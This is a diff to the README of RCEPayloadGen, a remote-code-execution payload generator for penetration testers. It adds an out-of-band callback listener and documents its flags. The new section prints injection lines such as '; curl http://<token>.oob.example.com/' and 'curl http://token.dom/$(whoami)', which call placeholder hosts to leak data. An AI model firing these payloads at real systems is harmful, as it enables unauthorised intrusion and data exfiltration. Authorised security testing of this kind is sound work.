@@ -1,6 +1,6 @@
 # RCEPayloadGen - Advanced RCE Payload Generator
 
-**Version 1.0.0** (semantic versioning; see `--version`).
+**Version 1.1.0** (semantic versioning; see `--version`).
 
 RCEPayloadGen is a comprehensive Remote Code Execution payload generator designed for penetration testers, security researchers, and red teamers. This tool generates a wide variety of RCE payloads tailored to different environments, contexts, encoding methods, and specific execution sinks.
 
@@ -13,6 +13,7 @@ RCEPayloadGen is a comprehensive Remote Code Execution payload generator designe
 - **Modular Templates**: Payload bases are stored in editable JSON/YAML templates so teams can extend coverage without touching Python source code
 - **Customizable**: Fine-tune payload generation with various command-line options
 - **Built-in Verification Harness**: `--verify-url` fires the payloads at an authorised target and reports which actually executed, using each payload's oracle — closing the generate → deliver → confirm loop from one command
+- **Built-in OOB Listener**: `--listen` runs a lightweight HTTP+DNS listener that receives out-of-band callbacks and correlates each one back to the exact payload via its token — closing the blind/OOB loop without a separate interactsh/Collaborator
 - **Machine-Readable Success Signatures**: Every payload carries a `match` field — the reflected canary/OOB token, or an inferred command-output regex (`id` → `uid=\d+`, `/etc/passwd` → `root:...`) — so a verifier, Nuclei, or Burp macro can auto-confirm execution instead of eyeballing output
 - **Out-of-Band (OOB) Support**: Blind-RCE payloads that call back to your collaborator/interactsh domain, each stamped with a unique correlation token and recorded in a `token → payload` manifest so a received callback maps to exactly one payload
 - **Tooling Integrations**: Export directly as **Burp/ffuf** wordlists (grouped by injection context, plus a request template) or as runnable **Nuclei** templates with built-in OOB / time-based / reflection oracles
@@ -115,6 +116,10 @@ python rce_payload_gen.py --detection-only
 | `--verify-url` | Authorised target URL with a `FUZZ` marker; fire payloads and confirm execution via their oracle | None |
 | `--verify-data` / `--verify-header` / `--verify-method` | Request body (with `FUZZ`) / repeatable header / HTTP method for verification | — |
 | `--verify-delay` / `--verify-timeout` | Seconds between requests / per-request timeout for verification | `0` / `8` |
+| `--listen` | Run the built-in OOB listener (HTTP+DNS) that correlates callbacks to payload tokens | Off |
+| `--correlate` | A `.map.jsonl` manifest to map received tokens back to payloads | None |
+| `--listen-http-port` / `--listen-dns-port` | Listener HTTP port / UDP DNS port | `8080` / `5335` |
+| `--listen-answer-ip` / `--listen-log` | IP returned by DNS answers / file to append hits as JSONL | `127.0.0.1` / None |
 | `--include-metadata` | Emit indicators, safety tiers, and notes | Disabled |
 | `--max-safety` | Highest safety tier to include (`safe`, `intrusive`, `stateful`) | `safe` in detection, `intrusive` otherwise |
 | `--include-blocking` | Include blocking or timing-based probes | Disabled |
@@ -368,6 +373,31 @@ python rce_payload_gen.py --acknowledge-consent \
 - OOB payloads are sent but confirmed out-of-band — watch your listener for their tokens.
 - Requires `--acknowledge-consent`; every run is written to `exploit_audit.log`.
   **Only run this against systems you are authorised to test.**
+
+## Out-of-Band Listener
+
+`--listen` runs a built-in listener that receives OOB callbacks and correlates
+each one to the payload that produced it (via the token in a `.map.jsonl`
+manifest) — closing the loop for blind RCE without a separate interactsh.
+
+```bash
+# 1) generate OOB payloads (writes oob.txt + oob.txt.map.jsonl)
+python rce_payload_gen.py --acknowledge-consent --categories oob \
+  --oob-domain your-id.oob.example.com --output oob.txt
+
+# 2) run the listener, correlating callbacks to those payloads
+python rce_payload_gen.py --listen --correlate oob.txt.map.jsonl \
+  --listen-http-port 8080 --listen-dns-port 53
+```
+
+```
+[listen] OOB listener up — HTTP :8080, DNS :53
+[HIT] http token=8k2hn1ufohpv from 10.0.0.5 -> ; curl http://8k2hn1ufohpv.oob.example.com/ [oob/raw]
+```
+
+- Correlates by token in the callback host **or** path (so DNS/HTTP exfil like `curl http://token.dom/$(whoami)` still maps back).
+- `--listen-answer-ip` sets the IP returned in DNS answers; `--listen-log` appends hits as JSONL.
+- For real engagements, point the OOB domain's NS/A records at this host (port 53 needs root); for lab use, aim payloads straight at the listener's host/port.
 
 ## Output Formats & Integrations
 
